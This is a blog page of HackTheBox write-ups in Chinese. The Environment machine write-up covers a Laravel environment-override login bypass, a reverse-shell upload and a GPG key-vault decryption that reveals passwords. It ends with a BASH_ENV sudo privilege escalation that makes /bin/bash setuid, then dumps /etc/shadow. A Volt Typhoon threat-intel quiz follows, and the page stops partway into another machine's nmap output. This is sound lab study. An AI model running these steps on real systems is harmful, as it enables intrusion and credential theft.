<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 5c:02:33:95:ef:44:e2:80:<span class="built_in">cd</span>:3a:96:02:23:f1:92:64 (ECDSA)</span><br><span class="line">|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.22.1</span><br><span class="line">|_http-server-header: nginx/1.22.1</span><br><span class="line">|_http-title: Did not follow redirect to http://environment.htb</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>这个吧唧可能存在waf，nmap扫的时候可以加一点<code>-Pn -D RND:5</code><br><code>好吧，没有waf，纯是我的代理问题</code><br>把域名加到hosts里面</p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p><img src="/images/environment-1.png"><br>平平无奇<br>扫一下目录和子域<br>子域没扫出来<br>目录倒是扫出来一点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[14:39:44] 301 -  169B  - /build  -&gt;  http://environment.htb/build/</span><br><span class="line">[14:40:29] 200 -    0B  - /favicon.ico</span><br><span class="line">[14:40:54] 200 -    2KB - /index.php/login/</span><br><span class="line">[14:41:06] 200 -    2KB - /login</span><br><span class="line">[14:41:06] 200 -    2KB - /login/</span><br><span class="line">[14:41:08] 302 -  358B  - /logout  -&gt;  http://environment.htb/login</span><br><span class="line">[14:41:09] 302 -  358B  - /logout/  -&gt;  http://environment.htb/login</span><br><span class="line">[14:42:02] 200 -   24B  - /robots.txt</span><br><span class="line">[14:42:32] 301 -  169B  - /storage  -&gt;  http://environment.htb/storage/</span><br><span class="line">[14:42:44] 405 -  245KB - /upload</span><br><span class="line">[14:42:44] 405 -  245KB - /upload/</span><br></pre></td></tr></table></figure>
<p><img src="/images/environment-2.png"><br>robots没啥，有一个login和upload<br><img src="/images/environment-3.png"><br>看来只能上burp了<br><img src="/images/environment-4.png"><br>上来就两个cookie<br><img src="/images/environment-5.png"><br>对登录页POST一下发现body里面有一个remember的key，应该是bool的形式，改一下试试<br><img src="/images/environment-6.png"><br>改成true之后会出现server error的页面，看提示是Laravel的，找一下有没有相关的exploit<br>另外，他的页面上也给了一点提示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(<span class="variable">$keep_loggedin</span> !== False) &#123;</span><br><span class="line">    // TODO: Keep user logged <span class="keyword">in</span> <span class="keyword">if</span> he selects <span class="string">&quot;Remember Me?&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(App::environment() == <span class="string">&quot;preprod&quot;</span>) &#123; //QOL: login directly as me <span class="keyword">in</span> dev/local/preprod envs</span><br><span class="line">        <span class="variable">$request</span>-&gt;session()-&gt;regenerate();</span><br><span class="line">        <span class="variable">$request</span>-&gt;session()-&gt;put(<span class="string">&#x27;user_id&#x27;</span>, 1);</span><br><span class="line">        <span class="built_in">return</span> redirect(<span class="string">&#x27;/management/dashboard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$user</span> = User::<span class="built_in">where</span>(<span class="string">&#x27;email&#x27;</span>, <span class="variable">$email</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line">这段代码检查当前应用程序运行的环境是否为 preprod（预生产环境）。App::environment() 是 Laravel 提供的方法，用于获取当前环境（例如 <span class="built_in">local</span>、dev、preprod、production）。</span><br><span class="line">如果当前环境是 preprod，执行以下操作：</span><br><span class="line"><span class="variable">$request</span>-&gt;session()-&gt;regenerate();: 重新生成会话 ID，以防止会话固定攻击（session fixation）。</span><br><span class="line"><span class="variable">$request</span>-&gt;session()-&gt;put(<span class="string">&#x27;user_id&#x27;</span>, 1);: 在会话中存储 user_id 为 1，相当于直接将用户 ID 为 1 的用户标记为已登录。</span><br><span class="line"><span class="built_in">return</span> redirect(<span class="string">&#x27;/management/dashboard&#x27;</span>);: 将用户重定向到 /management/dashboard 页面（可能是管理仪表板）。</span><br></pre></td></tr></table></figure>
<p>那顺便找一下如何进入到preprod环境</p>
<h3 id="CVE-2024-52301"><a href="#CVE-2024-52301" class="headerlink" title="CVE-2024-52301"></a>CVE-2024-52301</h3><p>可以翻到官方文档中的<a target="_blank" rel="noopener" href="https://laravel.com/docs/12.x/configuration">configuration</a>，和一个<a target="_blank" rel="noopener" href="https://github.com/Nyamort/CVE-2024-52301">CVE</a>，利用一下试试<br><img src="/images/environment-7.png"><br><img src="/images/environment-8.png"><br>ok，i got it</p>
<h3 id="upload-php-reverse-shell-and-bypass"><a href="#upload-php-reverse-shell-and-bypass" class="headerlink" title="upload php reverse shell and bypass"></a>upload php reverse shell and bypass</h3><p>翻了一下，简单的没有，只有profile有用一点，有一个upload的地方，正好扫目录的时候出现upload<br><img src="/images/environment-9.png"><br>传一下试试<br><img src="/images/environment-10.png"><br>传不了php，改一下<br>经过测试发现限制还挺多<br><img src="/images/environment-11.png"><br><strong>如果选择上传jpeg的话，他会提示”message”:”Unexpected MimeType: application/octet-stream”</strong>，很奇怪<br>访问一下上传的文件<br><img src="/images/environment-12.png"><br>got it</p>
<h2 id="shell-as-www-data"><a href="#shell-as-www-data" class="headerlink" title="shell as www-data"></a>shell as www-data</h2><p>shell可能容易断，多弹几次<br>在文件夹里遨游一下</p>
<h3 id="database-sqlite-rabbit-hole"><a href="#database-sqlite-rabbit-hole" class="headerlink" title="database.sqlite rabbit hole"></a>database.sqlite rabbit hole</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:~/app/database$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">database.sqlite  database.sqlite-journal  factories  migrations  seeders</span><br></pre></td></tr></table></figure>
<p>有一个数据库，nc传过来<br><img src="/images/environment-13.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bethany	bethany@environment.htb		$2y$12<span class="variable">$6kbg21YDMaGrt</span>.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.</span><br><span class="line">Hish	hish@environment.htb		$2y$12<span class="variable">$QPbeVM</span>.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi</span><br><span class="line">Jono	jono@environment.htb		$2y$12<span class="variable">$i</span>.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm</span><br></pre></td></tr></table></figure>
<p>crack一下<br>不好，上当了，又是解不出来的<br>接着翻。。。<br>怎么回事，翻到了什么<br><img src="/images/environment-14.png"><br>好吧，在hish家里翻一翻</p>
<h3 id="gpg-decrypt"><a href="#gpg-decrypt" class="headerlink" title="gpg decrypt"></a>gpg decrypt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish/backup$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">keyvault.gpg</span><br></pre></td></tr></table></figure>
<p>在backup下面有一个gpg文件，传过来<br>gpg2john crack hash and 。。。<br>然后就会发现解不出这个hash，淦，又在欺骗<br>家里边没有.ssh，但是有一个.gnupg，利用一下吧<br>先看下刚刚那个怎么加密</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ gpg --list-packets backup/keyvault.gpg</span><br><span class="line">gpg --list-packets backup/keyvault.gpg</span><br><span class="line">gpg: Fatal: can<span class="string">&#x27;t create directory &#x27;</span>/var/www/.gnupg<span class="string">&#x27;: Permission denied</span></span><br></pre></td></tr></table></figure>
<p>当前目录还看不了<br>给他换个地方指定一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ gpg --homedir=/tmp --list-packets /tmp/keyvault.gpg</span><br><span class="line">&lt;gpg --homedir=/tmp --list-packets /tmp/keyvault.gpg</span><br><span class="line">gpg: encrypted with RSA key, ID B755B0EDD6CFCFD3</span><br><span class="line">gpg: decryption failed: No secret key</span><br><span class="line"><span class="comment"># off=0 ctb=85 tag=1 hlen=3 plen=268</span></span><br><span class="line">:pubkey enc packet: version 3, algo 1, keyid B755B0EDD6CFCFD3</span><br><span class="line">        data: [2046 bits]</span><br><span class="line"><span class="comment"># off=271 ctb=d2 tag=18 hlen=2 plen=157 new-ctb</span></span><br><span class="line">:encrypted data packet:</span><br><span class="line">        length: 157</span><br><span class="line">        mdc_method: 2</span><br></pre></td></tr></table></figure>
<p>可以看到时RSA key加密，那正好有.gnupg，也给他来一下子</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ <span class="built_in">cp</span> -r /home/hish/.gnupg /tmp                          </span><br><span class="line"><span class="built_in">cp</span> -r /home/hish/.gnupg /tmp </span><br><span class="line"></span><br><span class="line"><span class="comment"># 导进去</span></span><br><span class="line">www-data@environment:/home/hish$ gpg --homedir=/tmp/.gnupg --list-secret-keys          </span><br><span class="line">gpg --homedir=/tmp/.gnupg --list-secret-keys</span><br><span class="line">gpg: WARNING: unsafe permissions on homedir <span class="string">&#x27;/tmp/.gnupg&#x27;</span></span><br><span class="line">/tmp/.gnupg/pubring.kbx      </span><br><span class="line">-----------------------                                                               </span><br><span class="line">sec   rsa2048 2025-01-11 [SC]                                                         </span><br><span class="line">      F45830DFB638E66CD8B752A012F42AE5117FFD8E</span><br><span class="line">uid           [ultimate] hish_ &lt;hish@environment.htb&gt;</span><br><span class="line">ssb   rsa2048 2025-01-11 [E]     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出来</span></span><br><span class="line">www-data@environment:/home/hish$ gpg --homedir=/tmp/.gnupg --decrypt /tmp/keyvault.gpg </span><br><span class="line">&lt; --homedir=/tmp/.gnupg --decrypt /tmp/keyvault.gpg </span><br><span class="line">gpg: WARNING: unsafe permissions on homedir <span class="string">&#x27;/tmp/.gnupg&#x27;</span></span><br><span class="line">gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11</span><br><span class="line">      <span class="string">&quot;hish_ &lt;hish@environment.htb&gt;&quot;</span></span><br><span class="line">PAYPAL.COM -&gt; Ihaves0meMon<span class="variable">$yhere123</span></span><br><span class="line">ENVIRONMENT.HTB -&gt; marineSPm@ster!! &lt;-- password</span><br><span class="line">FACEBOOK.COM -&gt; summerSunnyB3ACH!!</span><br></pre></td></tr></table></figure>
<p>有密码了，su一下可以登录hish用户</p>
<h2 id="shell-as-hish"><a href="#shell-as-hish" class="headerlink" title="shell as hish"></a>shell as hish</h2><p><code>sudo -l</code>看一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@environment:/home/hish$ su hish</span><br><span class="line">su hish</span><br><span class="line">Password: marineSPm@ster!!</span><br><span class="line"></span><br><span class="line">hish@environment:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> hish: marineSPm@ster!!</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hish on environment:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    env_keep+=<span class="string">&quot;ENV BASH_ENV&quot;</span>, use_pty</span><br><span class="line"></span><br><span class="line">User hish may run the following commands on environment:</span><br><span class="line">    (ALL) /usr/bin/systeminfo</span><br></pre></td></tr></table></figure>
<p>oh ho可以看到有一个<code>ENV BASH_ENV</code>，可以进行一下命令注入，也可以问问gpt<br><img src="/images/environment-15.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod 4777 /bin/bash&#x27;</span> &gt; /tmp/evil.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/evil.sh</span><br><span class="line"><span class="built_in">export</span> BASH_ENV=/tmp/evil.sh</span><br><span class="line"><span class="built_in">sudo</span> /usr/bin/systeminfo</span><br></pre></td></tr></table></figure>
<p><img src="/images/environment-16.png"><br>got root</p>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@environment:/home/hish# <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$y$j9T<span class="variable">$ri4ncGGOHy2ucyMf0</span>/wae1<span class="variable">$qfFOfsAj1qUCeQyGnjCYhdLQ9XqcCOBscht51lZEei1</span>:20094:0:99999:7:::</span><br><span class="line">daemon:*:20094:0:99999:7:::</span><br><span class="line">bin:*:20094:0:99999:7:::</span><br><span class="line">sys:*:20094:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:20094:0:99999:7:::</span><br><span class="line">games:*:20094:0:99999:7:::</span><br><span class="line">man:*:20094:0:99999:7:::</span><br><span class="line">lp:*:20094:0:99999:7:::</span><br><span class="line">mail:*:20094:0:99999:7:::</span><br><span class="line">news:*:20094:0:99999:7:::</span><br><span class="line">uucp:*:20094:0:99999:7:::</span><br><span class="line">proxy:*:20094:0:99999:7:::</span><br><span class="line">www-data:*:20094:0:99999:7:::</span><br><span class="line">backup:*:20094:0:99999:7:::</span><br><span class="line">list:*:20094:0:99999:7:::</span><br><span class="line">irc:*:20094:0:99999:7:::</span><br><span class="line">_apt:*:20094:0:99999:7:::</span><br><span class="line">nobody:*:20094:0:99999:7:::</span><br><span class="line">systemd-network:!*:20094::::::</span><br><span class="line">systemd-timesync:!*:20094::::::</span><br><span class="line">messagebus:!:20094::::::</span><br><span class="line">avahi-autoipd:!:20094::::::</span><br><span class="line">sshd:!:20094::::::</span><br><span class="line">hish:$y$j9T<span class="variable">$4I1ToSPTrzuz2EoDweHsP</span>/<span class="variable">$7rS9lhc9</span>.n/Hrx4r.bJ9KsKIpOaPDV0mj4pgLV2PF/7:20094:0:99999:7:::</span><br><span class="line">_laurel:!:20185::::::</span><br></pre></td></tr></table></figure>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/ElectricBreeze-1/ElectricBreeze-1/">HackTheBox——SherLocks ElectricBreeze-1 Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/ElectricBreeze-1.png"></p>
<pre><code>Your security team must always be up-to-date and aware of the threats targeting organizations in your industry. As you begin your journey as a Threat Intelligence Intern, equipped with some SOC experience, your manager has assigned you a task to test your research skills and how effectively you can leverage the MITRE ATT&amp;CK framework. * Conduct thorough research on Volt Typhoon. * Use the MITRE ATT&amp;CK framework to map adversary behavior and tactics into actionable insights. Impress your manager with your assessment, showcasing your passion for threat intelligence.

您的安全团队必须始终掌握最新动态，并了解您所在行业中针对组织的威胁。当您以威胁情报实习生的身份开启您的职业生涯时，您已经具备了一些安全运营中心 (SOC) 经验，您的经理会给您分配一项任务，以测试您的研究技能以及您如何有效地利用 MITRE ATT&amp;CK 框架。* 对 Volt Typhoon 进行深入研究。* 使用 MITRE ATT&amp;CK 框架将攻击者的行为和策略转化为切实可行的洞察。用您的评估来打动您的经理，展现您对威胁情报的热情。
</code></pre>
<p>没有文件下载，全是Google信息收集</p>
<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><pre><code>Based on MITRE&#39;s sources, since when has Volt Typhoon been active?
根据 MITRE 的消息来源，Volt Typhoon 自何时开始活跃？
</code></pre>
<p>Google一下这个东东<br><img src="/images/ElectricBreeze-1-13.png"><br>里面有一句话<code>has been active since at least 2021</code>，所以答案是<br><code>Answer:2021</code></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><pre><code>MITRE identifies two OS credential dumping techniques used by Volt Typhoon. One is LSASS Memory access (T1003.001). What is the Attack ID for the other technique?
MITRE 发现 Volt Typhoon 使用了两种操作系统凭据转储技术。一种是 LSASS 内存访问 (T1003.001)。另一种技术的攻击 ID 是什么？
</code></pre>
<p>往下滑搜索dump可以看到<br><img src="/images/ElectricBreeze-1-1.png"><br><code>Answer:T1003.003</code></p>
<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><pre><code>Which database is targeted by the credential dumping technique mentioned earlier?
前面提到的凭证转储技术针对的是哪个数据库？
</code></pre>
<p>点进第二个可以看到<br><img src="/images/ElectricBreeze-1-2.png"><br><code>Answer:Active Directory</code></p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><pre><code>Which registry hive is required by the threat actor to decrypt the targeted database?  
威胁行为者需要哪个注册表配置单元来解密目标数据库？
</code></pre>
<p>找注册表相关的<br><img src="/images/ElectricBreeze-1-3.png"><br><code>Answer:SYSTEM</code></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><pre><code>During the June 2024 campaign, an adversary was observed using a Zero-Day Exploitation targeting Versa Director. What is the name of the Software/Malware that was used?
在 2024 年 6 月的活动中，观察到对手使用针对 Versa Director 的零日漏洞利用。被使用的软件/恶意软件的名称是什么？ 
</code></pre>
<p>回到<code>Volt Typhoon</code>，在里面找<code>Versa Director</code><br><img src="/images/ElectricBreeze-1-4.png"><br>开发了一个新的webshell<br><code>Answer:VersaMem</code></p>
<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><pre><code>According to the Server Software Component, what type of malware was observed?
根据服务器软件组件，观察到什么类型的恶意软件？
</code></pre>
<p>答案在上面<br><code>Answer:web shell</code></p>
<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><pre><code>Where did the malware store captured credentials?
恶意软件将捕获的凭据存储在哪里？
</code></pre>
<p>点进<code>VersaMem</code>介绍可以看到<br><img src="/images/ElectricBreeze-1-5.png"><br><code>Answer:/tmp/.temp.data</code></p>
<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><pre><code>According to MITRE’s reference, a Lumen/Black Lotus Labs article(Taking The Crossroads: The Versa Director Zero-Day Exploitaiton.), what was the filename of the first malware version scanned on VirusTotal?
根据 MITRE 的参考，一篇 Lumen/Black Lotus Labs 的文章（Taking The Crossroads: The Versa Director Zero-Day Exploitaiton.），扫描的第一个恶意软件版本在 VirusTotal 上的文件名是什么？
</code></pre>
<p>下滑可以找到文章链接<a target="_blank" rel="noopener" href="https://blog.lumen.com/uncovering-the-versa-director-zero-day-exploitation/">Taking the Crossroads: The Versa Director Zero-Day Exploitation</a><br>在文章中可以看到<br><img src="/images/ElectricBreeze-1-6.png"><br><code>Answer:VersaTest.png</code></p>
<h2 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h2><pre><code>What is the SHA256 hash of the file?
文件的 SHA256 哈希值？
</code></pre>
<p>有耐心再往下滑可以看到已经给了<br><img src="/images/ElectricBreeze-1-7.png"><br><code>Answer:4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37</code></p>
<h2 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h2><pre><code>According to VirusTotal, what is the file type of the malware?
根据 VirusTotal，这个恶意软件的文件类型是什么？
</code></pre>
<p>可能他给的图不算太清楚，但也能看到<br>可以直接在<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37">VirusTotal</a>搜索上面的hash<br><img src="/images/ElectricBreeze-1-8.png"><br><code>Answer:jar</code></p>
<h2 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h2><pre><code>What is the &#39;Created by&#39; value in the file&#39;s Manifest according to VirusTotal?
根据 VirusTotal，文件 Manifest 中的&#39;创建者&#39;值是什么？
</code></pre>
<p>在VirusTotal中detail下滑可以看到<br><img src="/images/ElectricBreeze-1-9.png"><br><code>Answer:Apache Maven 3.6.0</code></p>
<h2 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h2><pre><code>What is the CVE identifier associated with this malware and vulnerability?
与此恶意软件和漏洞相关的 CVE 标识符是什么？
</code></pre>
<p>CVE在文件旁边也有<br><img src="/images/ElectricBreeze-1-10.png"><br><code>Answer:cve-2024-39717</code></p>
<h2 id="Task13"><a href="#Task13" class="headerlink" title="Task13"></a>Task13</h2><pre><code>According to the CISA document(https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf) referenced by MITRE, what is the primary strategy Volt Typhoon uses for defense evasion?
根据 CISA 文档（ https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf ）被 MITRE 引用的内容，Volt Typhoon 使用的防御规避的主要策略是什么？
</code></pre>
<p>翻文档（英文文档翻起来麻烦）<br><img src="/images/ElectricBreeze-1-11.png"><br>第三页有一个名词<code>living off the land</code> 本地利用<br>感兴趣可以看一下<a target="_blank" rel="noopener" href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/living-off-the-land-attack/">What Are Living off the Land (LOTL) Attacks?</a><br><code>Answer:LOTL</code></p>
<h2 id="Task14"><a href="#Task14" class="headerlink" title="Task14"></a>Task14</h2><pre><code>In the CISA document, which file name is associated with the command potentially used to analyze logon patterns by Volt Typhoon?
在 CISA 文档中，哪个文件名与 Volt Typhoon 用于分析登录模式的命令相关？
</code></pre>
<p>在附表中可以看到一个<code>OBSERVED COMMANDS</code>，在那里可以看到想要的<br><img src="/images/ElectricBreeze-1-12.png"><br><code>Answer:C:\users\public\documents\user.dat</code></p>
<p>Game Over<br>题外话：还有兴趣可以看一下<a target="_blank" rel="noopener" href="https://medium.com/cyber-warriors/a-cyber-threat-intelligence-journey-from-hack-the-box-to-locked-shields-dae306d511cb">A Cyber Threat Intelligence Journey</a></p>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Certificate/Certificate/">HackTheBox——HTB Certificate Writeup</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/certificate-25.png"></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION                                                                                                                        </span><br><span class="line">53/tcp    open  domain        Simple DNS Plus                                                                                                                </span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)                                                                                 </span><br><span class="line">|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30                                                                                         </span><br><span class="line">|_http-title: Did not follow redirect to http://certificate.htb/                                                                                             </span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-06-01 07:36:02Z)                                                                 </span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          </span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-01T07:37:41+00:00; +7h38m40s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.certificate.htb             </span><br><span class="line">| Subject Alternative Name: othername: 